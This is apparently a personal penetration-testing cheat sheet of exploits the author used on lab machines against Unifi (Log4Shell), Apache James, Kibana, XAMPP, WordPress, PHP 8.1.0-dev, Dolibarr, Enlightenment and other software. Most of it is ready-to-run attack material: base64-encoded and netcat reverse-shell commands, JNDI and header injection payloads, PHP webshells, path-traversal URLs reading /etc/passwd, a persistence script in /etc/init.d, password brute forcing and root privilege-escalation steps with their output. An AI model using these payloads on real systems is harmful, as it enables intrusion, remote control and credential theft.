---
description: 'tl;dr: This page tracks things I have pwn''d before with public exploits'
---

# Things I have Pwn'd before

* `https://ippsec.rocks/?#`

### Unifi Log4Shell

* Unifi Network 6.4.54
* [https://www.sprocketsecurity.com/resources/another-log4j-on-the-fire-unifi](https://www.sprocketsecurity.com/resources/another-log4j-on-the-fire-unifi)
* Testing, capture auth attempt in burp with creds `test:test`
* Start `tcpdump` on your host station:

```
sudo tcpdump -i tun0 port 389
```

<figure><img src="../.gitbook/assets/image (5) (1) (2).png" alt=""><figcaption></figcaption></figure>

* The server will response with `invalid payload` however it is still connecting back to us, check `tcpdump` to ensure the connect back

![](<../.gitbook/assets/image (7) (1).png>)

* Now install the required packages:

```
sudo apt update
sudo apt update install openjdk-11-jdk -y
java -version
sudo apt-get install maven
mvn -v
```

* After the payload has been created, start the Rogue-JNDI application while passing in the payload as part of the `--command` option and your tun0 IP address to the `--hostname` option.

```
git clone https://github.com/veracode-research/rogue-jndi && cd rogue-jndi && mvn package
echo 'bash -c bash -i >&/dev/tcp/10.10.15.96/9001 0>&1' | base64
java -jar /opt/rogue-jndi/target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTUuOTYvOTAwMSAwPiYxCg==}|{base64,-d}|{bash,-i}" --hostname "10.10.15.96"
```

* `--hostname` is your localhost tun0 interface
* Now start your listener
* Going back to our intercepted POST request, let's change the payload to `${jndi:ldap://{Your Tun0 IP}:1389/o=tomcat}` and click `Send`

### Apache Struts2

```
80/tcp open http Apache Tomcat/Coyote JSP engine 1.1
|_http-server-header: Apache-Coyote/1.1
| http-title: Santa Naughty and Nice Tracker
```

* USE:

```
search struts2
exploit(multi/http/struts2_content_type_ognl)
```

### Microsoft-ds port 445

* `445/tcp open miscrosoft-ds`
* Run the nmap eternal scripts
* USE:

```
nmap --script=smb-vuln* $ip
exploit(windows/smb/ms08_067_netapi)
exploit(windows/smb/ms17_010_eternalblue)
```

### Wing FTP Server

* **Windows (admin panel):** `21/tcp open wingftp` — gain access to admin panel; `search lua` then `exploit(windows/ftp/wing_ftp_admin_exec)`.
* **Linux web client:** Exposed on HTTP (often subdomain e.g. `ftp.target.htb`). RCE via command injection (EDB 52347). See [Wing FTP Server (Linux web client)](wing-ftp.md) for subdomain discovery, exploit usage, config/salted hashes, world-writable user XML overwrite, and CVE-2025-4517 priv esc.

### Mantis Bug Tracker

* `80/tcp open http mantisbt-2.3.0`
* CVE:2019-15715 2017-7615
* Mantis Bug Tracker 2.3.0 - Remote Code Execution (Unauthenticated)

### James POP3

`110/tcp open POP3`

* James POP3 Server 2.3.2
* https://www.exploit-db.com/exploits/35513
* [https://vk9-sec.com/apache-james-server-2-3-2-cve-2015-7611/](https://vk9-sec.com/apache-james-server-2-3-2-cve-2015-7611/)

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1 | nc 172.16.6.2 3333 >/tmp/f
echo "#!/bin/bash" > /etc/init.d/james
echo "bash -i >& /dev/tcp/172.16.6.2/5555 0>&1" >> /etc/init.d/james
cat /etc/init.d/james
sudo /sbin/reboot
```

### Kibana

* 5601 is the elastic search port, 9200 is the api

```
curl -X GET "10.10.15.175:9200/_search?q=password&pretty"                                                                                                                                                                  130 ⨯
{
  "took" : 11,
  "timed_out" : false,
  "_shards" : {
    "total" : 6,
    "successful" : 6,
    "skipped" : 0,
    "failed" : 0
  },
  "hits" : {
    "total" : 1,
    "max_score" : 2.0136302,
    "hits" : [
      {
        "_index" : "messages",
        "_type" : "_doc",
        "_id" : "73",
        "_score" : 2.0136302,
        "_source" : {
          "sender" : "mary",
          "receiver" : "wendy",
          "message" : "hey, can you access my dev account for me. My username is l33tperson and my password is 9Qs58Ol3AXkMWLxiEyUyyf"
```

* If there are log files like on port 8000 which are showing you active kabana logs you can have a LFI vulnerability
* Go to the 5601 port and add this extension `/api/console/api_server?sense_version=@@SENSE_VERSION&apis=../../../../../../.../../../../root.txt`

```
10.10.156.71:5601/api/console/api_server?sense_version=@@SENSE_VERSION&apis=../../../../../../.../../../../root.txt
```

* Then curl the logs and grep for root.txt

```
curl -s http://10.10.31.117:8000/kibana-log.txt | grep "root.txt" 
```

* Also can be used to get a shell in other situations
* https://github.com/mpgn/CVE-2018-17246

### Sync Breeze Enterprise

* Sync Breeze Enterprise v8.9.24
* https://www.exploit-db.com/exploits/40456

```
msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=172.16.6.1 LPORT=4444 -e x86/shikata_ga_nai -b '\x00\x0a\x0d\x26' -f python --smallest
```

### Microsoft ds

```
exploit/windows/smb/ms17_010_eternalblue
```

### Android

* 5555/tcp open freeciv
* Install adb

```
adb connect [target ip address:port]
```

### Joomla versions 3.6.3

* Able to use joomra.py in order to create an account and login

```
python3 joom.py -u jack -p password -e jack@gmail.com http://10.10.10.10
```

* Edit the templates
* Add in webshell
* Can read the config files which has the use and password, then can ssh in

### XAMPP

* Got in through phpmyadmin \[root:no password]
* Able to get shell through SQL database commands

```
SELECT "<?php echo shell_exec($_GET['cmd']); ?>" into outfile "C:/xampp/htdocs/xampp/shell.php";
```

* Then browse to:

```
10.10.10.10/xampp/shell.php?cmd=dir
```

* Look for config files with passwords

```
C:\xampp\htdocs\admin\config.php
```

### Lucky GetSimple!

```
10.16.1.2/data/users/lucky.xml
```

* See the config file and passwd hash with username, crack in john
* PE with dirtycow \[CVE-2016-5195]
* Compile with

```
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
```

### Dolphin Wordpress

* Dolphin <7.3.2 Auth bypass / RCE exploit by Ahmed Sultan

### Codiad Impresscms

```
10.10.10.10/codiad/data/users.php
```

* Directories found

```
/config.php
/data
/wordspace
```

* Upload web shell
* Found SSH creds

### Techblog (Wordpress Siteimport Exploit)

* ![wp](https://user-images.githubusercontent.com/75596877/129896695-6c92634a-f5cc-4c47-96c3-a9fbc3dfcd1d.png)
* LFI

```
http://10.16.1.3/wp-content/plugins/site-import/readme.txt
http://10.16.1.3/wp-content/plugins/site-import/admin/page.php
http://10.16.1.3/wp-content/plugins/site-import/admin/page.php?url=..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\windows\win.ini
http://10.16.1.3/wp-content/plugins/site-import/admin/page.php?url=../../../../../../../../../../etc/passwd
wp-config.php file #has the login creds
```

### Backupadmin

* Priv Esc on box with Amanda running, view by -LFI Exploit

```
fileinfo.php?sha1=..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
```

* ![Screenshot 2021-08-18 081521](https://user-images.githubusercontent.com/75596877/129896411-01115472-b6f1-4219-b143-f55cdb3c2b7d.png)
* ![Screenshot 2021-08-18 081521](https://user-images.githubusercontent.com/75596877/129896519-57dfb207-eaa6-4846-93de-c73a77d4e5ef.png)

```
ls -al /usr/lib/amanda
echo '#!/bin/sh
> /bin/sh' > priv.sh
chmod +x priv.sh
/usr/lib/amanada/application/amstar restore --star-path=/tmp/priv.sh
$ whoami
root
```

#### mysql Brute Force

* mysql 3306 running on the target

```
hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://10.16.1.11
mysql -u root 10.16.1.11 -p
SHOW DATABASES;
SHOW TABLES FROM helpdesk;
USE helpdesk;
SELECT * FROM ost_form_entry;
```

### IP Fire 2.15

* Brute the admin default \[admin:admin]
* https://github.com/0xskunk/IPFire-2.15-Shellshock-Exploit/blob/master/SIPS.py

### init.d linux pe

*

    <figure><img src="https://user-images.githubusercontent.com/75596877/129897354-b6d4149f-4a29-4f65-9af7-8410d1a0d4a5.png" alt=""><figcaption></figcaption></figure>
*

    <figure><img src="https://user-images.githubusercontent.com/75596877/129897409-37fe5930-49c2-4e74-9859-4b0d3467a73f.png" alt=""><figcaption></figcaption></figure>
*

    <figure><img src="https://user-images.githubusercontent.com/75596877/129897438-9d485c16-473d-46cc-a6c5-17edbfd47063.png" alt=""><figcaption></figcaption></figure>

### webserv

* NAS4Free -Web shell via the file editor

### Pro FTPD 1.3.5

* https://github.com/t0kx/exploit-CVE-2015-3306/blob/master/exploit.py

### TeamCity Linux Priv Esc

* Port was only listening locally so had to port forward in order to be able to browse to it

```
ssh sys-internal@10.10.250.201 -i id_rsa -L 8111:localhost:8111
```

* TeamCity operates on port `8111` by default
* Then could go to `localhost:8111` in my browser
* Was asked for a authentication token to login as super user
* In the path

```
/TeamCity/logs
```

* I was able to find a file called `catalina.out` which reading the contents provided me the authentication token

```
[TeamCity] Super user authentication token: 8119166573167676780
```

* Once you have gained access Create a new project
* ![alt text](https://miro.medium.com/max/2400/1*2X-pj25DAE7RoL3ifAI5Hg.png)
* Next fill in the build configurations
* ![alt text](https://miro.medium.com/max/2400/1*hKdxKO8ihqutmUqyDfHSNg.png)
* Next click build steps and use the following command to let `/bin/bash` run with full root privlages
* ![alt text](https://miro.medium.com/max/2400/1*NKdC7RmnSvhK0vl3o3J9Og.png)
* Click `save`, and then `run`
* Back to the command line and run:

```
/bin/bash -p
whoami
root
```

### ClipBucket

* File upload vulnerability with authentication

```
curl --user developers:9972761drmfsls -F "file=@php_reverse_shell.php" -F "plupload=1" -F "name=php_reverse_shell.php" "http://broadcast.vulnnet.thm/actions/photo_uploader.php"
curl --user developers:9972761drmfsls -F "file=@php_reverse_shell.php" -F "plupload=1" -F "name=php_reverse_shell.php" "http://broadcast.vulnnet.thm/actions/beats_uploader.php"
curl --user developers:9972761drmfsls -F "file=@shell.php" -F "plupload=1" -F "name=shell.php" "http://broadcast.vulnnet.thm/actions/beats_uploader.php"
```

* Site will tell you the MD5 Hash name of the file and the directory it is located. Make sure to add the `.php` extension to the end.

### PHP 8.1.0-dev

* This version of php was backdoored
* Detect with nikto or by capturing the server response in burp
* `X-Powered-By: PHP 8/1/0/dev` --> what you are looking for
* Automated POC exploit
* [https://www.exploit-db.com/exploits/49933](https://www.exploit-db.com/exploits/49933)
* Manual Exploitation:
* Capture a request in burp suite
* Add additional `User-Agentt` header to the request (yes it is supposed to be spelled with two t's)
* Payload:

```
User-Agentt: zerodiumsystem('bash -c "bash -i >& /dev/tcp/10.10.14.13/9001 0>&1"');
```

### Open Net Admin (ona)

* Metasploit module for CMD injection 18.1.1
* [https://www.exploit-db.com/exploits/47772](https://www.exploit-db.com/exploits/47772)
* Database file with credentials is located here:

```
 /opt/ona/www/local/config/database_settings.inc.php
```

### Wordpress HelloDolly Plugin&#x20;

<pre><code>https://yebberdog.medium.com/try-hack-me-jack-walkthrough-904035594dc2
<strong>- craft shell from hacktricks 
</strong>- from revshells.com
&#x3C;?php $sock=fsockopen("10.10.14.2",80);passthru("/bin/bash &#x3C;&#x26;3 >&#x26;3 2>&#x26;3"); ?>
- update dolly code 
File edited successfully.
- now activate it 

&#x3C;?php if(isset($_REQUEST["cmd"])){ echo "&#x3C;pre>"; $cmd = ($_REQUEST["cmd"]); system($cmd); echo "&#x3C;/pre>"; die; }?>

http://10.10.110.100:65000/wordpress/wp-content/plugins/hello.php?cmd=id
- code execution...
uid=33(www-data) gid=33(www-data) groups=33(www-data)
</code></pre>

### [Dolibarr 17.0.0](https://www.dolibarr.org)

* auth RCE [https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253](https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253)

```
python3 exploit.py http://crm.board.htb admin admin 10.10.14.53 9001
[*] Trying authentication...
[**] Login: admin
[**] Password: admin
[*] Trying created site...
[*] Trying created page...
[*] Trying editing page and call reverse shell... Press Ctrl+C after successful connection

nc -nlvp 9001
listening on [any] 9001 ...
connect to [10.10.14.53] from (UNKNOWN) [10.10.11.11] 53264
bash: cannot set terminal process group (858): Inappropriate ioctl for device
bash: no job control in this shell
www-data@boardlight:~/html/crm.board.htb/htdocs/public/website$ 
```

### CVE-2022-37706-Enlightenment-0.25.3-LPE

* If you see a suid binary called `enlightenment_sys`
* [https://www.exploit-db.com/exploits/51180](https://www.exploit-db.com/exploits/51180)
* in order to exploit, Ive had to alter the script

```
# change below 
${file} /bin/mount -o
noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=$(id -u),
"/dev/../tmp/;/tmp/exploit" /tmp///net

# to this (no line breaks)
${file} /bin/mount -o noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=$(id -u), "/dev/../tmp/;/tmp/exploit" /tmp///net
```

```
./poc.sh 
CVE-2022-37706
[*] Trying to find the vulnerable SUID file...
[*] This may take few seconds...
[+] Vulnerable SUID binary found!
[+] Trying to pop a root shell!
[+] Welcome to the rabbit hole :)
mount: /dev/../tmp/: can't find in /etc/fstab.
# id
uid=0(root) gid=0(root) groups=0(root),4(adm),1000(larissa)
# 
```

### Pluck CMS 4.7.18

[https://www.exploit-db.com/raw/49909](https://www.exploit-db.com/raw/49909)

[https://codingninjablogs.tech/tryhackme-dreaming-pluck-cms-44575d7e558a](https://codingninjablogs.tech/tryhackme-dreaming-pluck-cms-44575d7e558a)

User Input:

```
target_ip = sys.argv[1]
target_port = sys.argv[2]
password = sys.argv[3]
pluckcmspath = sys.argv[4]

python3 exploit.py greenhorn.htb 80 iloveyou1 /
Authentification was succesfull, uploading webshell
Uploaded Webshell to: 
http://greenhorn.htb:80//files/shell.phar

data/inc/files.php: $blockedExtentions = array('.php','php3','php4','php5','php6','php7','phtml','.phtm','.pht','.ph3','.ph4','.ph5','.asp','.cgi','.phar');
PHP: .php, .php2, .php3, .php4, .php5, .php6, .php7, .phps, .phps, .pht, .phtm, .phtml, .pgif, .shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module
```

* file upload is not working well

[https://www.youtube.com/watch?v=GpL\_rz8jgro](https://www.youtube.com/watch?v=GpL_rz8jgro)

* go to [http://greenhorn.htb/admin.php?action=installmodule](http://greenhorn.htb/admin.php?action=installmodule)

```
zip test.zip php-rev.php
adding: php-rev.php (deflated 59%)
```

* upload the zip

### De-Pixel PDF to find password

* depixel file to get password

```
https://pdf2png.com/
// tool
https://github.com/spipm/Depix
python3 depix.py \
    -p ../../image_page_1_1.png \                    
    -s images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png
2024-07-25 19:31:34,915 - Loading pixelated image from ../../image_page_1_1.png
2024-07-25 19:31:34,929 - Loading search image from images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png
2024-07-25 19:31:35,788 - Finding color rectangles from pixelated space
2024-07-25 19:31:35,790 - Found 252 same color rectangles
2024-07-25 19:31:35,790 - 190 rectangles left after moot filter
2024-07-25 19:31:35,790 - Found 1 different rectangle sizes
2024-07-25 19:31:35,790 - Finding matches in search image
2024-07-25 19:31:35,790 - Scanning 190 blocks with size (5, 5)
2024-07-25 19:31:35,829 - Scanning in searchImage: 0/1674
```
